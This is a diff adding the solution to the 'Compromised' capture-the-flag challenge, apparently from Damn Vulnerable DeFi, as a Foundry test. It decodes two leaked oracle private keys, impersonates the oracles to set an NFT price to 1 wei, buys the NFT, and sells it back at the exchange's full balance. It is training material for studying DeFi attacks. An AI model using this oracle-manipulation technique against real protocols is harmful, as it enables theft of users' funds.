@@ -77,9 +77,47 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+        //  Get hexadecimal from desciption of the challenge & convert it into private keys with online tools
+
+        // Base64 is used for encoding binary data (e.g., images, files) into a text
+        // format that can be safely transmitted in text-based protocols like email or included
+        // in data formats like JSON or XML.
+
+        // UTF-8 is primarily used for representing text data and can handle a wide range of characters from different
+        // languages. UTF-8 is used for encoding text, while Base64 is used for encoding binary data as text.
+
+        // hexadecimal > base64-encoded string (Ascii)) > UTF8 (text)
+        address Oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address Oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
+
+        // Set Price - 1 WEI, and buy the NFT
+        vm.prank(Oracle1);
+        trustfulOracle.postPrice("DVNFT", 1);
+        vm.prank(Oracle2);
+        trustfulOracle.postPrice("DVNFT", 1);
+        vm.prank(attacker);
+        uint256 tokenid = exchange.buyOne{value: 0.1 ether}();
+
+        // Set Price - 999ETH + 1 WEI, and sell the NFT
+        vm.prank(Oracle1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+        vm.prank(Oracle2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 1);
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenid);
+        exchange.sellOne(tokenid);
+        vm.stopPrank();
+
+        // Restore Original Price
+        vm.prank(Oracle1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(Oracle2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
         /**
          * EXPLOIT END *
          */
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
